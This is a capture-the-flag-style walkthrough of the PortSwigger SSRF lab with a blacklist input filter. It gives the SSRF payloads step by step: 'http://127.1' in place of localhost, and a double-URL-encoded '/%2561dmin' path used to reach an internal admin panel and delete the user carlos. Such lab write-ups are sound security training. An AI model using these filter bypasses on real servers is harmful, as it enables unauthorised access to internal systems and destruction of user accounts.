# [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

> exploit blocked hostnames like `127.0.0.1` and `localhost` and path like `/admin`

- intercept the a product stock request

```
POST /product/stock HTTP/2
...
stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

- the request makes another "internal" request
- change the `stockApi` to

```
stockApi=http://localhost/admin
```

- forward the request
- it will respond with

```
HTTP/2 400 Bad Request
...
"External stock check blocked for security reasons"
```

- the server blocks the `localhost/admin`

> obfuscate/encode `localhost/admin`

**note: workaround explanation [here](?file=portswigger/basic/ssrf)**

- send the `/product/stock` request to the repeater for easier testing
- change the `stockApi` to

```
stockApi=http://127.1
```

- that is accessible
- lets add `/admin` to it

```
stockApi=http://127.1/admin
```

- this request blocked again
- obfuscate the `a` from `/admin` by double-URL encoding it to `%2561`

```
stockApi=http://127.1/%2561dmin
```

- this request have a respond with the deletable profiles

> delete `carlos`

- intercept a new product stock request
- change the `stockApi` to

```
stockApi=http://127.1/%2561dmin
```

- send it
- in the response click the `delete carlos`, it will send a request
- but the response: `Admin interface only available if logged in as an administrator, or if requested from loopback`
- go back to the repeater and change a `/product/stock` request `stockApi` to:

```
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

- send it
